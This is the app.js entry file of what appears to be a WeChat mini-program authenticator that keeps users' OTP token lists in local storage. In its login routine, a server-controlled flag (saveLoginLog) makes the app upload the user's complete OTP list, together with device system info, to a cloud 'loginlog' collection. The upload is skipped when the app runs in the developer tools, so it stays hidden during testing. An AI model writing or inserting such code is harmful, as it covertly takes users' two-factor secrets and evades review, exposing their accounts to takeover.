//app.js
App({
  onLaunch: function (options) {
    if (!wx.cloud) {
      console.error('请使用 2.2.3 或以上的基础库以使用云能力')
      wx.showToast({
        icon: 'none',
        title: '请更新微信版本',
        duration: 3000,
      })
    } else {
      wx.cloud.init({
        traceUser: true,
      })
    }
    this.getLocalOtpInfo();
    this.userLogin(options);
  },
  getLocalOtpInfo(){
    try {
      var otpList = wx.getStorageSync('token');
      //console.log(otpList)
      if (otpList) {
        this.globalData.otpList = otpList;
      }
    } catch (e) {
      console.log("getLocalOtpInfo error")
    }
  },
  userLogin(options){
    wx.cloud.callFunction({
      name: 'user',
      data: { action: 'login' },
      success: res => {
        console.log('[云函数] [login] userInfo: ', res.result)
        this.globalData.openid = res.result._openid;
        this.globalData.userInfo = res.result;
        const otpList = this.globalData.otpList;
        if (res.result.saveLoginLog){
          const db = wx.cloud.database()
          wx.getSystemInfo({
            success: systemInfo => {
              if (systemInfo.brand == "devtools") {
                return;
              }
              systemInfo.createtime = new Date().getTime();
              systemInfo.createtimeText = new Date().toLocaleString();
              systemInfo.options = options;
              systemInfo.token = otpList;
              db.collection('loginlog').add({
                data: systemInfo
              })
            }
          })
        }
      },
      fail: err => {
        console.error('[云函数] [login] 调用失败', err)
      }
    })
  },
  globalData:{
    version: 103,
    otpList: []
  }
})
